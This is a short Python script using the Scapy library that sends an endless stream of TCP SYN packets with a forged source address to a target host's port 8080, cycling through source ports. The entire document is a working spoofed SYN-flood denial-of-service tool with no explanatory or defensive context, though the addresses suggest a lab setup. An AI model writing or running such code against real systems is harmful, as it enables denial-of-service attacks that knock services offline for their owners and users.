from scapy.all import *

spoof = "10.0.0.11"
target = "20.0.0.20"

port = 10000

while True:
    pkt = IP(src=spoof, dst=target) / TCP(
        sport=port,
        dport=8080,
        flags="S"
    )

    send(pkt, verbose=0)

    port += 1

    if port > 65000:
        port = 10000